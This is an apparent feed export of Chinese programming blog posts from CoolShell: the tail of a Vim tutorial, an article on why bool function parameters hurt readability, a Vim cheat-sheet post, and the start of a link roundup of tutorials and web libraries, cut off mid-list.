<ul>
<li>
<code>2dd</code> → 删除2行</li>
<li>
<code>3p</code> → 粘贴文本3次</li>
<li>
<code>100idesu [ESC]</code> → 会写下 “desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu “</li>
<li>
<code>.</code> → 重复上一个命令—— 100 “desu “.</li>
<li>
<code>3.</code> → 重复 3 次 “desu” (注意：不是 300，你看，VIM多聪明啊).</li>
</ul>
</blockquote>
<h5 id="stronger">
<span class="ez-toc-section" id="%E6%9B%B4%E5%BC%BA"></span>更强<span class="ez-toc-section-end"></span>
</h5>
<p>你要让你的光标移动更有效率，你一定要了解下面的这些命令，<strong>千万别跳过</strong>。</p>
<ol>
<li>N<code>G</code> → 到第 N 行 （陈皓注：注意命令中的G是大写的，另我一般使用 : N 到第N行，如 :137 到第137行）</li>
<li>
<code>gg</code> → 到第一行。（陈皓注：相当于1G，或 :1）</li>
<li>
<code>G</code> → 到最后一行。</li>
<li>按单词移动：<br>
<blockquote>
<ol>
<li>
<code>w</code> → 到下一个单词的开头。</li>
<li>
<code>e</code> → 到下一个单词的结尾。</li>
</ol>
<p>&gt; 如果你认为单词是由默认方式，那么就用小写的e和w。默认上来说，一个单词由字母，数字和下划线组成（陈皓注：程序变量）</p>
<p>&gt; 如果你认为单词是由blank字符分隔符，那么你需要使用大写的E和W。（陈皓注：程序语句）</p>
<p><img alt="image placeholder" ></p>
</blockquote>
</li>
</ol>
<p>下面，让我来说说最强的光标移动：</p>
<blockquote>
<ul>
<li>
<code>%</code> : 匹配括号移动，包括 <code>(</code>, <code>{</code>, <code>[</code>. （陈皓注：你需要把光标先移到括号上）</li>
<li>
<code>*</code> 和 <code>#</code>:  匹配光标当前所在的单词，移动光标到下一个（或上一个）匹配单词（*是下一个，#是上一个）</li>
</ul>
</blockquote>
<p>相信我，上面这三个命令对程序员来说是相当强大的。</p>
<h5 id="faster">
<span class="ez-toc-section" id="%E6%9B%B4%E5%BF%AB"></span>更快<span class="ez-toc-section-end"></span>
</h5>
<p>你一定要记住光标的移动，因为很多命令都可以和这些移动光标的命令连动。很多命令都可以如下来干：</p>
<p><code>&lt;start position&gt;&lt;command&gt;&lt;end position&gt;</code></p>
<p>例如 <code>0y$</code> 命令意味着：</p>
<ul>
<li>
<code>0</code> → 先到行头</li>
<li>
<code>y</code> → 从这里开始拷贝</li>
<li>
<code>$</code> → 拷贝到本行最后一个字符</li>
</ul>
<p>你可可以输入 <code>ye</code>，从当前位置拷贝到本单词的最后一个字符。</p>
<p>你也可以输入 <code>y2/foo</code> 来拷贝2个 “foo” 之间的字符串。</p>
<p>还有很多时间并不一定你就一定要按y才会拷贝，下面的命令也会被拷贝：</p>
<ul>
<li>
<code>d</code> (删除 )</li>
<li>
<code>v</code> (可视化的选择)</li>
<li>
<code>gU</code> (变大写)</li>
<li>
<code>gu</code> (变小写)</li>
<li>等等</li>
</ul>
<div>（陈皓注：可视化选择是一个很有意思的命令，你可以先按v，然后移动光标，你就会看到文本被选择，然后，你可能d，也可y，也可以变大写等）</div>
<h4 id="th-level----vim-superpowers">
<span class="ez-toc-section" id="%E7%AC%AC%E5%9B%9B%E7%BA%A7_-_Vim_%E8%B6%85%E8%83%BD%E5%8A%9B"></span>第四级 – Vim 超能力<span class="ez-toc-section-end"></span>
</h4>
<p>你只需要掌握前面的命令，你就可以很舒服的使用VIM了。但是，现在，我们向你介绍的是VIM杀手级的功能。下面这些功能是我只用vim的原因。</p>
<h5 id="move-on-current-line-0---f-f-t-t--">
<span class="ez-toc-section" id="%E5%9C%A8%E5%BD%93%E5%89%8D%E8%A1%8C%E4%B8%8A%E7%A7%BB%E5%8A%A8%E5%85%89%E6%A0%87_0_f_F_t_T"></span>在当前行上移动光标: <code>0</code> <code>^</code> <code>$</code> <code>f</code> <code>F</code> <code>t</code> <code>T</code> <code>,</code> <code>;</code><span class="ez-toc-section-end"></span>
</h5>
<blockquote>
<ul>
<li>
<code>0</code> → 到行头</li>
<li>
<code>^</code> → 到本行的第一个非blank字符</li>
<li>
<code>$</code> → 到行尾</li>
<li>
<code>g_</code> → 到本行最后一个不是blank字符的位置。</li>
<li>
<code>fa</code> → 到下一个为a的字符处，你也可以fs到下一个为s的字符。</li>
<li>
<code>t,</code> → 到逗号前的第一个字符。逗号可以变成其它字符。</li>
<li>
<code>3fa</code> → 在当前行查找第三个出现的a。</li>
<li>
<code>F</code> 和 <code>T</code> → 和 <code>f</code> 和 <code>t</code> 一样，只不过是相反方向。<br>
<img alt="image placeholder" >
</li>
</ul>
</blockquote>
<p>还有一个很有用的命令是 <code>dt"</code> → 删除所有的内容，直到遇到双引号—— <code>"。</code></p>
<h5 id="zone-selection-actionaobject-or-actioniobject">
<span class="ez-toc-section" id="%E5%8C%BA%E5%9F%9F%E9%80%89%E6%8B%A9_a_%E6%88%96_i"></span>区域选择 <code>&lt;action&gt;a&lt;object&gt;</code> 或 <code>&lt;action&gt;i&lt;object&gt;</code><span class="ez-toc-section-end"></span>
</h5>
<p>在visual 模式下，这些命令很强大，其命令格式为</p>
<p><code>&lt;action&gt;a&lt;object&gt;</code> 和 <code>&lt;action&gt;i&lt;object&gt;</code></p>
<ul>
<li>action可以是任何的命令，如 <code>d</code> (删除), <code>y</code> (拷贝), <code>v</code> (可以视模式选择)。</li>
<li>object 可能是： <code>w</code> 一个单词， <code>W</code> 一个以空格为分隔的单词， <code>s</code> 一个句字， <code>p</code> 一个段落。也可以是一个特别的字符：<code>"、</code> <code>'、</code> <code>)、</code> <code>}、</code> <code>]。</code>
</li>
</ul>
<p>假设你有一个字符串 <code>(map (+) ("foo"))</code>.而光标键在第一个 <code>o </code>的位置。</p>
<blockquote>
<ul>
<li>
<code>vi"</code> → 会选择 <code>foo</code>.</li>
<li>
<code>va"</code> → 会选择 <code>"foo"</code>.</li>
<li>
<code>vi)</code> → 会选择 <code>"foo"</code>.</li>
<li>
<code>va)</code> → 会选择<code>("foo")</code>.</li>
<li>
<code>v2i)</code> → 会选择 <code>map (+) ("foo")</code>
</li>
<li>
<code>v2a)</code> → 会选择 <code>(map (+) ("foo"))</code>
</li>
</ul>
</blockquote>
<p><img alt="image placeholder" ></p>
<h5 id="select-rectangular-blocks-c-v">
<span class="ez-toc-section" id="%E5%9D%97%E6%93%8D%E4%BD%9C"></span>块操作: <code>&lt;C-v&gt;</code><span class="ez-toc-section-end"></span>
</h5>
<p>块操作，典型的操作： <code>0 &lt;C-v&gt; &lt;C-d&gt; I-- [ESC]</code></p>
<ul>
<li>
<code>^</code> → 到行头</li>
<li>
<code>&lt;C-v&gt;</code> → 开始块操作</li>
<li>
<code>&lt;C-d&gt;</code> → 向下移动 (你也可以使用hjkl来移动光标，或是使用%，或是别的)</li>
<li>
<code>I-- [ESC]</code> → I是插入，插入“<code>--</code>”，按ESC键来为每一行生效。</li>
</ul>
<p><img alt="image placeholder" ></p>
<p>在Windows下的vim，你需要使用 <code>&lt;C-q&gt;</code> 而不是 <code>&lt;C-v&gt;</code> ，<code>&lt;C-v&gt;</code> 是拷贝剪贴板。</p>
<h5 id="completion-c-n-and-c-p">
<span class="ez-toc-section" id="%E8%87%AA%E5%8A%A8%E6%8F%90%E7%A4%BA%EF%BC%9A_%E5%92%8C"></span>自动提示： <code>&lt;C-n&gt;</code> 和 <code>&lt;C-p&gt;</code><span class="ez-toc-section-end"></span>
</h5>
<p>在 Insert 模式下，你可以输入一个词的开头，然后按 <code>&lt;C-p&gt;或是&lt;C-n&gt;，自动补齐功能就出现了……</code></p>
<p><code></code><img alt="image placeholder" ></p>
<h5 id="macros--qa-do-something-q-a-">
<span class="ez-toc-section" id="%E5%AE%8F%E5%BD%95%E5%88%B6%EF%BC%9A_qa_%E6%93%8D%E4%BD%9C%E5%BA%8F%E5%88%97_q_a"></span>宏录制： <code>qa</code> 操作序列 <code>q</code>, <code>@a</code>, <code>@@</code><span class="ez-toc-section-end"></span>
</h5>
<ul>
<li>
<code>qa</code> 把你的操作记录在寄存器 <code>a。</code>
</li>
<li>于是 <code>@a</code> 会replay被录制的宏。</li>
<li>
<code>@@</code> 是一个快捷键用来replay最新录制的宏。</li>
</ul>
<blockquote>
<p><strong><em>示例</em></strong></p>
<p>在一个只有一行且这一行只有“1”的文本中，键入如下命令：</p>
<ul>
<li>
<code>qaYp&lt;C-a&gt;q</code>→
<ul>
<li>
<code>qa</code> 开始录制</li>
<li>
<code>Yp</code> 复制行.</li>
<li>
<code>&lt;C-a&gt;</code> 增加1.</li>
<li>
<code>q</code> 停止录制.</li>
</ul>
</li>
<li>
<code>@a</code> → 在1下面写下 2</li>
<li>
<code>@@</code> → 在2 正面写下3</li>
<li>现在做 <code><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2312131363">[email protected]</a>@</code> 会创建新的100行，并把数据增加到 103.</li>
</ul>
</blockquote>
<p><img alt="image placeholder" ></p>
<h5 id="visual-selection-vvc-v">
<span class="ez-toc-section" id="%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%89%E6%8B%A9%EF%BC%9A_vV"></span>可视化选择： <code>v</code>,<code>V</code>,<code>&lt;C-v&gt;</code><span class="ez-toc-section-end"></span>
</h5>
<p>前面，我们看到了 <code>&lt;C-v&gt;</code>的示例 （在Windows下应该是&lt;C-q&gt;），我们可以使用 <code>v</code> 和 <code>V</code>。一但被选好了，你可以做下面的事：</p>
<ul>
<li>
<code>J</code> → 把所有的行连接起来（变成一行）</li>
<li>
<code>&lt;</code> 或 <code>&gt;</code> → 左右缩进</li>
<li>
<code>=</code> → 自动给缩进 （陈皓注：这个功能相当强大，我太喜欢了）</li>
</ul>
<p><img alt="image placeholder" ></p>
<p>在所有被选择的行后加上点东西：</p>
<ul>
<li><code>&lt;C-v&gt;</code></li>
<li>选中相关的行 (可使用 <code>j</code> 或 <code>&lt;C-d&gt;</code> 或是 <code>/pattern</code> 或是 <code>%</code> 等……)</li>
<li>
<code>$</code> 到行最后</li>
<li>
<code>A</code>, 输入字符串，按 <code>ESC。</code>
</li>
</ul>
<p><img alt="image placeholder" ></p>
<h5 id="splits-split-and-vsplit">
<span class="ez-toc-section" id="%E5%88%86%E5%B1%8F_split_%E5%92%8C_vsplit"></span>分屏: <code>:split</code> 和 <code>vsplit</code>.<span class="ez-toc-section-end"></span>
</h5>
<p>下面是主要的命令，你可以使用VIM的帮助 <code>:help split</code>. 你可以参考本站以前的一篇文章<a title="Vim的分屏功能" href="https://coolshell.cn/articles/1679.html" target="_blank">VIM分屏</a>。</p>
<blockquote>
<ul>
<li>
<code>:split</code> → 创建分屏 (<code>:vsplit</code>创建垂直分屏)</li>
<li>
<code>&lt;C-w&gt;&lt;dir&gt;</code> : dir就是方向，可以是 <code>hjkl</code> 或是 ←↓↑→ 中的一个，其用来切换分屏。</li>
<li>
<code>&lt;C-w&gt;_</code> (或 <code>&lt;C-w&gt;|</code>) : 最大化尺寸 (&lt;C-w&gt;| 垂直分屏)</li>
<li>
<code>&lt;C-w&gt;+</code> (或 <code>&lt;C-w&gt;-</code>) : 增加尺寸</li>
</ul>
</blockquote>
<p><img alt="image placeholder" ></p>
<h4 id="conclusion">
<span class="ez-toc-section" id="%E7%BB%93%E6%9D%9F%E8%AF%AD"></span>结束语<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>上面是作者最常用的90%的命令。</li>
<li>我建议你每天都学1到2个新的命令。</li>
<li>在两到三周后，你会感到vim的强大的。</li>
</ul>
<ul>
<li>有时候，学习VIM就像是在死背一些东西。</li>
<li>幸运的是，vim有很多很不错的工具和优秀的文档。</li>
<li>运行vimtutor直到你熟悉了那些基本命令。</li>
<li>其在线帮助文档中你应该要仔细阅读的是 <code>:help usr_02.txt</code>.</li>
<li>你会学习到诸如  <code>!，</code> 目录，寄存器，插件等很多其它的功能。</li>
</ul>
<p>学习vim就像学弹钢琴一样，一旦学会，受益无穷。</p>
<p style="text-align: center;">——————————正文结束——————————</p>
<p>对于vi/vim只是点评一点：这是一个你不需要使用鼠标，不需使用小键盘，只需要使用大键盘就可以完成很多复杂功能文本编辑的编辑器。不然，<a title="Visual Studio的Vim插件" href="https://coolshell.cn/articles/1901.html" target="_blank">Visual Studio也不就会有vim的插件了</a>。</p>
<p>(全文完)</p>
 ]]></content>
<pubDate>2011-09-07T08:27:26+08:00</pubDate>
<guid>https://coolshell.cn/articles/5426.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 千万不要把 bool 设计成函数参数 ]]></title>
<link>https://coolshell.cn/articles/5444.html</link>
<content><![CDATA[ 
<p>我们有很多Coding Style 或 代码规范。但这一条可能会经常被我们所遗忘，就是我们经常会在函数的参数里使用bool参数，这会大大地降低代码的可读性。不信？我们先来看看下面的代码。</p>
<p>当你读到下面的代码，你会觉得这个代码是什么意思？</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">widget-&gt;repaint(false);</code></p>
<p>是不要repaint吗？还是别的什么意思？看了文档后，我们才知道这个参数是immediate， 也就是说，false代表不立即重画，true代码立即重画。</p>
<p>Windows API中也有这样一个函数：InvalidateRect，当你看到下面的代码，你会觉得是什么意思？</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">InvalidateRect(hwnd, lpRect,  false);</code></p>
<p>我们先不说InvalidateRect这个函数名取得有多糟糕，我们先说一下那个false参数？invalidate意为“让XXX无效”，false是什么意思？双重否定？是肯定的意思？如果你看到这样的代码，你会相当的费解的。于是，你要去看一下文档，或是InvalidateRect的函数定义，你会看到那个参数是 <strong>BOOL</strong><em> bErase</em>，意思是，是否要重画背景。</p>
<p>这样的事情有很多，再看下面的代码，想把str中的”%USER%”替换成真实的用户名：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">str.replace("%USER%", user, false); // Qt 3</code></p>
<p>TNND，那个false是什么意思？不替换吗？还是别的什么意思，看了文档才知道，false代码大小写不敏感的替换。</p>
<p>其实，如果你使用枚举变量/常量，而不是bool变量，你会让你的代码更易读，如：</p>
<p><span id="more-5444"></span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">widget-&gt;repaint(PAINT::immediate);
widget-&gt;repaint(PAINT::deffer);

InvalidateRect(hwnd, lpRect,  !RepantBackground);

str.replace("%USER%", user, Qt::CaseInsensitive); // Qt 4</pre>
<p>如果对这个事不以为然的话，我们再来看一些别的示例，你不妨猜猜看看下面的代码：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">component.setCentered(true, false);</code></p>
<p>这什么玩意儿啊？看了文档你才知道，这原来是 setCentered(centered, autoUpdate);</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">new Textbox(300, 100, false, true);</code></p>
<p>这又是什么啊？看了文档才知道，这是创建一个文本框，第三个参数是是否要滚动条，第四个是是否要自动换行。TNND。</p>
<p>上面的情况还不算最差，看看下面的双重否定。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">component.setDisabled(false);
filter.setCaseInsensitive(false)</pre>
<p>再来一个，如果你读到下面的代码，相信你会和我一样，要么石化了，要么凌乱了。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">event.initKeyEvent("keypress", true, true, null, null,
                    false, false, false, false, 9, 0); </pre>
<p>看完这篇文章，我希望你再也不要把bool为作为函数参数了。除非两个原因：</p>
<ol>
<li>你100%确认不会带来阅读上的问题，比如Java的 setVisible (bool).</li>
<li>你100%确认你想去<a title="如何写出无法维护的代码" href="https://coolshell.cn/articles/4758.html" target="_blank">写出无法维护很难阅读的代码</a>。</li>
</ol>
<p>【更新2011/9/8】当然，别的参数也会有一样的问题，比如：<code>new Textbox(300, 100, false, true);</code>中的300 和 100，不知道是坐标还是长宽，只不过，一般长度或坐标这样的参数都不会被hard code，都会有变量名，而bool这种参数经常性地被传成true 和 false。 bool参数表现得更为明显一些罢了。</p>
<p><span style="color: #cc0000;">所以，程序中不要出现magic number，true/false 也是一种 magic number。但是，我想告诉大家，从API设计的角度来说，你无法强制调用者用常量来取代true/false，定义成枚举类型是最好的选择</span>。</p>
<p>最后，如果你想设计一个好的API，强烈推荐你读一下Nokia的Qt的《<a href="http://qt-project.org/wiki/API-Design-Principles" target="_blank">API Design Principles</a>》，本文就是其中的“<a href="http://developer.qt.nokia.com/wiki/API_Design_Principles#e7794937cba47d5e9c54d50a6a32328b" target="_blank">Boolean Trap</a>”。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-09-08T15:35:18+08:00</pubDate>
<guid>https://coolshell.cn/articles/5444.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 给程序员的VIM速查卡 ]]></title>
<link>https://coolshell.cn/articles/5479.html</link>
<content><![CDATA[ 
<p>前几天酷壳发布过“<a title="简明 Vim 练级攻略" href="https://coolshell.cn/articles/5426.html" target="_blank">vim简明攻略</a>”，不知道大家练得怎么样了。如果你练了一下，那么这里这个速查卡就会对你有帮助了。以前本站也有过一个（<a title="Vim命令速查卡" href="https://coolshell.cn/articles/150.html" target="_blank">vim速查卡</a>），不过其太简单了。我觉得这个很不错，很全，很直观。这个速查卡来自<strong><a href="http://michael.peopleofhonoronly.com/vim/" target="_blank">这里</a></strong>。其用颜色标注了级别：</p>
<ul>
<li>
<span style="background-color: #008000;"><span style="color: #ffffff;">  Green  </span></span> = 存活级</li>
<li>
<span style="background-color: #ffff00;">  Yellow  </span> = 感觉良好</li>
<li>
<span style="background-color: #ff8000;">  Orange  </span> / <span style="background-color: #0000ff;"><span style="color: #ffffff;">Blue</span></span> = 高级</li>
<li>
<span style="background-color: #ff0000;">  Red  </span> = 专家级</li>
</ul>
<p>下面的图片点击可以看大图：</p>
<figure id="attachment_5480" aria-describedby="caption-attachment-5480" style="width: 639px" class="wp-caption aligncenter"><a href="https://coolshell.cn/wp-content/uploads/2011/09/vim_cheat_sheet_for_programmers_print.png"><img alt="image placeholder" ></a><figcaption id="caption-attachment-5480" class="wp-caption-text">给程序员的VIM速查卡（点击看大图）</figcaption></figure>
<p>你还可以下载<a href="http://michael.peopleofhonoronly.com/vim/vim_cheat_sheet_for_programmers_print.pdf" target="_blank">PDF版</a>的和<a href="http://michael.peopleofhonoronly.com/vim/vim_cheat_sheet_for_programmers_print.xlsx" target="_blank">Excel版</a>的，如果你是色盲的话，还有<a href="http://michael.peopleofhonoronly.com/vim/vim_cheat_sheet_for_programmers_colorblind.pdf" target="_blank">蓝色版PDF</a>的。如果你不是很喜欢的话，这里还有几个：</p>
<p><span id="more-5479"></span></p>
<ul>
<li><a href="http://www.viemu.com/a_vi_vim_graphical_cheat_sheet_tutorial.html">http://www.viemu.com/a_vi_vim_graphical_cheat_sheet_tutorial.html</a></li>
<li><a href="http://tnerual.eriogerg.free.fr/vim.html">http://tnerual.eriogerg.free.fr/vim.html</a></li>
<li><a href="http://www.lagmonster.org/docs/vi.html">http://www.lagmonster.org/docs/vi.html</a></li>
<li><a href="http://jrmiii.com/2009/03/06/learning-vim-the-pragmatic-way.html">http://jrmiii.com/2009/03/06/learning-vim-the-pragmatic-way.html</a></li>
</ul>
<p></p>
 ]]></content>
<pubDate>2011-09-16T09:07:05+08:00</pubDate>
<guid>https://coolshell.cn/articles/5479.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一些文章和各种资源 ]]></title>
<link>https://coolshell.cn/articles/5224.html</link>
<content><![CDATA[ 
<p>下面是近期收录的一些文章和资源，希望对你有用。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%B3%BB%E7%BB%9F%E6%96%B9%E9%9D%A2" title="系统方面">系统方面</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%90%84%E7%A7%8D%E6%95%99%E7%A8%8B" title="各种教程">各种教程</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Web%E5%BA%93" title="Web库">Web库</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#HTML_5" title="HTML 5 
">HTML 5
</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#_%E7%BC%96%E7%A8%8B%E8%A7%84%E8%8C%83" title=" 编程规范"> 编程规范</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%B3%BB%E7%BB%9F%E6%96%B9%E9%9D%A2"></span>系统方面<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>印度的电子商务网站flipkart的性能扩展</strong>（PPT） <a href="http://www.slideshare.net/sids/how-flipkart-scales-php">http://www.slideshare.net/sids/how-flipkart-scales-php</a>，都是一些最基本的东西，对于初学者来说很不错。PPT做的也不错。</li>
</ul>
<ul>
<li>
<strong>Tagged.com的扩展之路</strong> – 1亿用户，1000台服务器，50亿的PV <a href="http://highscalability.com/blog/2011/8/8/tagged-architecture-scaling-to-100-million-users-1000-server.html">http://highscalability.com/blog/2011/8/8/tagged-architecture-scaling-to-100-million-users-1000-server.html</a> 还是PHP的WEB站点。另外，<a href="http://highscalability.com/" target="_blank">highscalability.com</a>这个网站上有很多和高性能有关的文章，很不错。比如最新的：<a href="http://highscalability.com/blog/2011/9/16/stuff-the-internet-says-on-scalability-for-september-16-2011.html">Stuff The Internet Says On Scalability For September 16, 2011</a>
</li>
</ul>
<p><a href="http://highscalability.com/" target="_blank"><img alt="image placeholder" ></a></p>
<ul>
<li>
<strong>浏览器是怎么工作的</strong>？ <a href="https://www.html5rocks.com/en/tutorials/internals/howbrowserswork/" target="_blank">http://www.html5rocks.com/en/tutorials/internals/howbrowserswork</a>/ 相当不错的一个教程，告诉你浏览器里面是怎么搞的，很不错。如果图片看不到，可以<a href="http://taligarsiel.com/Projects/howbrowserswork1.htm" target="_blank">看这里</a>。如果你英文不是太好，你可以看看<a href="http://blog.csdn.net/zzzaquarius/article/details/6532299" target="_blank">中译版</a>，译得并不是太好。</li>
</ul>
<figure style="width: 624px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption class="wp-caption-text">Mozilla's Gecko rendering engine main flow</figcaption></figure>
<ul>
<li>
<strong>怎么使用epoll的示例</strong> <a href="https://banu.com/blog/2/how-to-use-epoll-a-complete-example-in-c/">https://banu.com/blog/2/how-to-use-epoll-a-complete-example-in-c/</a>
</li>
</ul>
<ul>
<li>
<strong>Intel C/C++ 64位程序开发教程</strong> <a href="https://software.intel.com/en-us/articles/lessons-on-development-of-64-bit-cc-applications/" target="_blank">http://software.intel.com/en-us/articles/lessons-on-development-of-64-bit-cc-applications/</a> 本站以前也介绍过一个关于<a title="64位平台C/C++开发注意事项" href="https://coolshell.cn/articles/3512.html" target="_blank">64位C/C++的编程注意事项</a>。</li>
</ul>
<div><span id="more-5224"></span></div>
<h4>
<span class="ez-toc-section" id="%E5%90%84%E7%A7%8D%E6%95%99%E7%A8%8B"></span><span class="Apple-style-span" style="font-weight: 800;">各种教程</span><span class="ez-toc-section-end"></span>
</h4>
<ul>
<ul>
<li>
<strong>Version Control by Example</strong>(电子书) <a href="http://www.ericsink.com/vcbe/">http://www.ericsink.com/vcbe/</a>
</li>
</ul>
</ul>
<p><img alt="image placeholder" ><strong><strong><br>
</strong></strong></p>
<ul>
<li>
<strong><strong>SQL注入口袋书</strong></strong>（<a href="https://docs.google.com/Doc?docid=0AZNlBave77hiZGNjanptbV84Z25yaHJmMjk&amp;pli=1#Allowed_Intermediary_Character_30801873723976314" target="_blank">Google Doc</a> 需翻墙）<strong>，</strong>涵盖MySQL, MSSQL和Oracle，我觉得可以用来做你的程序的安全测试。<strong><br>
</strong>
</li>
</ul>
<ul>
<li>
<strong>如何写Vim的插件</strong>（教程）<a href="http://stevelosh.com/blog/2011/09/writing-vim-plugins/" target="_blank">http://stevelosh.com/blog/2011/09/writing-vim-plugins/</a> 相信你已读过“<a title="给程序员的VIM速查卡" href="https://coolshell.cn/articles/5479.html" target="_blank">VIM简明攻略</a>” 并收藏了 “<a title="给程序员的VIM速查卡" href="https://coolshell.cn/articles/5479.html" target="_blank">vim的速查卡</a>”，随着你的vim的能力加强，是时候搞搞vim的插件了。</li>
</ul>
<ul>
<li>
<strong>一个超有意思的学习Javascript的在线课件了</strong>。下面的这个网页上有一个Web的命令行，你可以跟着他的提示去输入一些命令，并以此来学习Javascript，这个创意真是太好了，我觉得这应该推广到我们的学校中去，不是只听老师讲，还需要大家一起来动作。 <a href="https://www.codecademy.com/" target="_blank">http://www.codecademy.com/</a>
</li>
</ul>
<ul>
<li>
<strong>一些各种各样的教程</strong> <a href="http://www.dickbaldwin.com/toc.htm">http://www.dickbaldwin.com/toc.htm</a>  这些都是些入门的教程，仅当是练练英语了。</li>
<ul>
<li><a href="http://www.dickbaldwin.com/tocint.htm">Introductory Java Tutorial</a></li>
<li><a href="http://www.dickbaldwin.com/tocmed.htm">Intermediate Java Tutorial </a></li>
<li><a href="http://www.dickbaldwin.com/tocadv.htm">Advanced Java Tutorial</a></li>
<li><a href="http://www.dickbaldwin.com/tocknowledge.htm">Test Your Java Knowledge</a></li>
<li><a href="http://www.dickbaldwin.com/tocjscript1.htm">JavaScript Tutorial</a></li>
<li><a href="http://www.dickbaldwin.com/tocxml.htm">XML — eXtensible Markup Language</a></li>
<li><a href="http://www.dickbaldwin.com/tocpyth.htm">Python Programming Tutorial</a></li>
<li><a href="http://www.dickbaldwin.com/tocCsharp.htm">C# Programming Tutorial</a></li>
<li><a href="http://www.dickbaldwin.com/tocdsp.htm">Digital Signal Processing</a></li>
</ul>
</ul>
<ul>
<ul>
<li><a href="http://www.dickbaldwin.com/Cosc1315/Pf00100Index.htm">Object-Oriented Programming Fundamentals using C++</a></li>
<li><a href="http://www.dickbaldwin.com/Cosc1315/Pfsg00100StudyGuideIndex.htm">Object-Oriented Programming Fundamentals using C++ (Practice Tests)</a></li>
<li><a href="http://www.dickbaldwin.com/Cosc1315/Slides/Pf00100MainSlideIndex.htm">Object-Oriented Programming Fundamentals using C++ (Slides)</a></li>
</ul>
</ul>
<ul>
<ul>
<li><a href="http://www.dickbaldwin.com/AdvOOP/AdvCpp00100Index.htm">Advanced Object-Oriented Programming using C++</a></li>
<li><a href="http://www.dickbaldwin.com/AdvOOP/PracticeTests/AdvCpp00100PracticeTestIndex.htm">Advanced Object-Oriented Programming using C++ (Practice Tests)</a></li>
<li><a href="http://www.dickbaldwin.com/AdvOOP/Slides/AdvCpMainSlideIndex.htm">Advanced Object-Oriented Programming using C++ (Slides)</a></li>
</ul>
</ul>
<ul>
<ul>
<li><a href="http://www.dickbaldwin.com/allegro/Allegro00100Index.htm">Graphics Programming with Allegro and C++</a></li>
<li><a href="http://www.dickbaldwin.com/allegro/PracticeTests/Allegro00100PracticeTestIndex.htm">Graphics Programming with Allegro and C++ (Practice Tests)</a></li>
<li><a href="http://www.dickbaldwin.com/allegro/Slides/AllegMainSlideIndex.htm">Graphics Programming with Allegro and C++ (Slides)</a></li>
</ul>
</ul>
<ul>
<ul>
<li><a href="http://www.austincc.edu/baldwin/Itnw1351Wireless/LabProjects/FwlProjIndex.htm">Wireless Networking Lab Projects</a></li>
<li><a href="http://www.dickbaldwin.com/tocalice.htm">Learn to Program using Alice</a></li>
<li><a href="http://www.dickbaldwin.com/tocHomeSchool.htm">Computer Programming for Homeschool Students and Other Beginners</a></li>
<li><a href="http://www.dickbaldwin.com/tocFlex.htm">Programming with Adobe Flex</a></li>
<li><a href="http://www.dickbaldwin.com/tocActionScript.htm">Object-Oriented Programming (OOP) with ActionScript </a></li>
<li><a href="http://www.dickbaldwin.com/tocXNA.htm">Programming with XNA Game Studio </a></li>
</ul>
</ul>
<h4>
<span class="ez-toc-section" id="Web%E5%BA%93"></span><strong>Web库</strong><span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>20 个 jQuery提示插件</strong>：<a href="http://zoomzum.com/jquery-tooltip-plugins/">http://zoomzum.com/jquery-tooltip-plugins/</a>
</li>
</ul>
<ul>
<li>
<strong>最近出的一个新的可以做Web幻灯片的Javscript</strong> <a href="https://imakewebthings.github.com/deck.js/#intro">http://imakewebthings.github.com/deck.js/#intro</a> 当然，Web上做幻灯片的库太多了，大家可以看看wikipedia上的一个收集： <a href="https://en.wikipedia.org/wiki/Web-based_slideshow">http://en.wikipedia.org/wiki/Web-based_slideshow</a>
</li>
</ul>
<ul>
<li>
<strong><a href="https://code.google.com/p/google-api-php-client/">Google APIs Client Library for PHP</a> – </strong>用PHP封装的各种Google API<br>
<img alt="image placeholder" >
</li>
<ul>
<li>Buzz API – <a href="https://code.google.com/p/google-api-php-client/source/browse/#svn%2Ftrunk%2Fexamples%2Fbuzz">Sample</a>
</li>
<li>Books API – <a href="https://code.google.com/p/google-api-php-client/source/browse/trunk/examples/books/index.php">Sample</a>
</li>
